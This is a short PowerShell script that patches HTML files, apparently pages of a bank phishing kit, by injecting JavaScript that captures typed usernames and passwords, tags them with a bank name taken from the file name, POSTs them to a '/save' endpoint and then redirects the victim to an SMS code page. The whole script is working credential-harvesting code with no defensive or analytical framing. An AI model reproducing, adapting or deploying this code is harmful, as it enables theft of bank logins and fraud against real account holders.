$files = Get-ChildItem -Path . -Filter *.html
foreach ($file in $files) {
    $content = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
    if ($content -match 'window\.location\.href = SMS_PAGE;') {
        if ($content -notmatch "fetch\('/save'") {
            $replacement = @"
        var bankName = window.location.pathname.split('/').pop().replace('.html', '').replace('_sms', '');
        var _data = {
            bank: bankName,
            type: 'login',
            fields: {
                username: uname ? uname.value : '',
                password: pwd ? pwd.value : ''
            }
        };
        fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(_data)
        }).then(function() {
            window.location.href = SMS_PAGE;
        }).catch(function() {
            window.location.href = SMS_PAGE;
        });
"@
            $content = $content -replace "window\.location\.href\s*=\s*SMS_PAGE;", $replacement
            [System.IO.File]::WriteAllText($file.FullName, $content, [System.Text.Encoding]::UTF8)
            Write-Host "Patched $($file.Name)"
        }
    }
}
